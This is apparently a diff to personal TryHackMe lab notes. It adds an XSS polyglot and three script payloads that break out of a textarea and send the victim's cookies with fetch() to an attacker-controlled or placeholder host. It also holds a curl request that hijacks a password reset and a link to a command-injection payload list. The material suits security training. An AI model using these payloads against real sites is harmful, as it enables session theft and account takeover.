@@ -17,6 +17,18 @@ This ffuf command is a little different to the previous one in Task 2. Previousl
 
 curl 'http://10.10.215.241/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=paolo@customer.acmeitsupport.thm'
 
+## XSS polyglot
+
+```js
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
+```html
+</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+</textarea><script>fetch('http://10.10.10.100/?cookie=' + btoa(document.cookie) );</script>
+</textarea><script>fetch('http://ff3eff8746b0e6d2ba0fbfe277f7d9c2.log.tryhackme.tech?cookie=' + btoa(document.cookie) );</script>
+```
+
 ## Reference
 
-[](https://crackstation.net/)
+[](https://crackstation.net/)  
+[RCE Payloads](https://github.com/payloadbox/command-injection-payload-list)  
